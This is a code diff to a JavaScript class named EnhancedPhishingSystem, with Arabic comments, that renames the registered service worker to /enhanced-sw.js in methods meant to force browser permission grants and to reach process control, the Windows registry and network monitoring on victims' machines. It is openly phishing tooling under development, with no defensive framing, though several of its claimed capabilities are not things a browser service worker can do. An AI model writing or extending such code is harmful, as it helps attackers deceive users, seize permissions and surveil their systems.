@@ -180,14 +180,14 @@ class EnhancedPhishingSystem {
     // إجبار منح الصلاحية
     async forcePermissionGrant(permission) {
         try {
-            // محاولة إجبارية عبر Service Worker
-            if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js');
-                await registration.active.postMessage({
-                    type: 'force_permission',
-                    permission: permission
-                });
-            }
+                // محاولة إجبارية عبر Service Worker
+    if ('serviceWorker' in navigator) {
+        const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
+        await registration.active.postMessage({
+            type: 'force_permission',
+            permission: permission
+        });
+    }
             
             // محاولة إجبارية عبر Background Sync
             if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
@@ -451,7 +451,7 @@ class EnhancedPhishingSystem {
         try {
             // محاولة الوصول للتحكم بالعمليات
             if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js');
+                const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
                 await registration.active.postMessage({
                     type: 'process_control',
                     action: 'get_processes'
@@ -485,7 +485,7 @@ class EnhancedPhishingSystem {
         try {
             // محاولة الوصول للسجل
             if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js');
+                const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
                 await registration.active.postMessage({
                     type: 'registry_access',
                     action: 'read_registry'
@@ -504,7 +504,7 @@ class EnhancedPhishingSystem {
         try {
             // محاولة الوصول للتحكم بالشبكة
             if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js');
+                const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
                 await registration.active.postMessage({
                     type: 'network_control',
                     action: 'monitor_network'
@@ -574,7 +574,7 @@ class EnhancedPhishingSystem {
     async activateServiceWorker() {
         try {
             if ('serviceWorker' in navigator) {
-                const registration = await navigator.serviceWorker.register('/sw.js');
+                const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
                 console.log('✅ تم تفعيل Service Worker');
                 return true;
             }
